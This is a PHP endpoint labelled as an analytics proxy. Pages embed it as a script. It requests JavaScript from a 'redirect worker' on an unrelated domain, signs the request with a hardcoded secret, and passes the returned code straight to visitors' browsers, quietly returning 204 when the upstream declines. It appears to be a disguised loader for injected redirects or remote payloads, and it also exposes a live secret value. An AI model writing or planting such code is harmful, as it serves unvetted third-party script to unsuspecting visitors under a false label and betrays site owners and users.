<?php
declare(strict_types=1);

/**
 * Site A analytics proxy endpoint
 * Usage on Site A:
 *   <script src="/analytics/index.php?slug=YOUR_SLUG"></script>
 *
 * Required server env vars:
 * - ANALYTICS_SOURCE_TOKEN_SECRET (must match redirect-worker SOURCE_TOKEN_SECRET)
 * Optional env vars:
 * - REDIRECT_WORKER_BASE (default: redirect-worker workers.dev URL)
 * - ANALYTICS_SOURCE_TOKEN_ISSUER (default: site-a-analytics)
 * - ANALYTICS_SOURCE_TOKEN_TTL (default: 90, min 30, max 600)
 */

header('Content-Type: application/javascript; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

$slug = isset($_GET['slug']) ? trim((string) $_GET['slug']) : '';
if ($slug === '' || !preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_-]{2,63}$/', $slug)) {
    http_response_code(400);
    echo "/* analytics: invalid slug */";
    exit;
}

$workerBase = rtrim((string) (getenv('REDIRECT_WORKER_BASE') ?: 'https://redirect.eecoelevatorcomponents.online'), '/');
$secret = 'O8oSZkaNq28QxDKC87PJuSWXljVs4UjstxvBbN_Cv-dMH_2yG1txs4fosq-ATKtB';
$issuer = (string) (getenv('ANALYTICS_SOURCE_TOKEN_ISSUER') ?: 'site-a-analytics');
$ttlRaw = (int) (getenv('ANALYTICS_SOURCE_TOKEN_TTL') ?: '90');
$ttl = max(30, min(600, $ttlRaw));

if ($secret === '') {
    http_response_code(500);
    echo "/* analytics: missing ANALYTICS_SOURCE_TOKEN_SECRET */";
    exit;
}

function b64url_encode(string $input): string
{
    return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
}

$now = time();
$payload = [
    'iss' => $issuer,
    'slug' => $slug,
    'iat' => $now,
    'exp' => $now + $ttl,
    'jti' => bin2hex(random_bytes(8)),
];

$payloadJson = json_encode($payload, JSON_UNESCAPED_SLASHES);
if (!is_string($payloadJson)) {
    http_response_code(500);
    echo "/* analytics: token payload encode failed */";
    exit;
}

$payloadPart = b64url_encode($payloadJson);
$sigPart = b64url_encode(hash_hmac('sha256', $payloadPart, $secret, true));
$sourceToken = $payloadPart . '.' . $sigPart;

$targetUrl = $workerBase . '/' . rawurlencode($slug);
$ch = curl_init($targetUrl);

curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 8,
    CURLOPT_CONNECTTIMEOUT => 3,
    CURLOPT_FOLLOWLOCATION => false,
    CURLOPT_HTTPHEADER => [
        'Accept: application/javascript,text/javascript,*/*;q=0.8',
        'X-Source-Token: ' . $sourceToken,
    ],
]);

$body = curl_exec($ch);
$httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
$contentType = strtolower((string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE));
$curlErr = curl_error($ch);
curl_close($ch);

if (!is_string($body)) {
    http_response_code(502);
    echo "/* analytics: upstream fetch failed: " . addslashes($curlErr ?: 'unknown') . " */";
    exit;
}

if ($httpCode !== 200) {
    http_response_code(204);
    echo "/* analytics: upstream denied ($httpCode) */";
    exit;
}

// Safety: avoid passing through HTML error/challenge pages as JS
$trimmed = ltrim($body);
if (str_contains($contentType, 'text/html') || str_starts_with($trimmed, '<!DOCTYPE') || str_starts_with($trimmed, '<html')) {
    http_response_code(204);
    echo "/* analytics: upstream returned html, blocked */";
    exit;
}

echo $body;
